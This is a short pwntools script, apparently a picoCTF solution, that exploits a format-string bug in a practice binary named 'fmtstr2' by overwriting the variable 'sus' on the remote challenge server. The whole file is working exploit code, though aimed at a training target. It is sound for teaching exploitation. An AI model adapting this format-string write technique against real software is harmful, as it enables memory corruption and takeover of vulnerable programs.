from pwn import *
context.log_level='debug'
r = remote('rhea.picoctf.net', 56693)
context.binary=ELF('./fmtstr2')
#r=gdb.debug('./fmtstr2', 'b *main+95\nc')
#r=process('./fmtstr2')
r.sendline(fmtstr_payload(14, {ELF('./fmtstr2').sym['sus']: 0x67616c66}))
r.interactive()
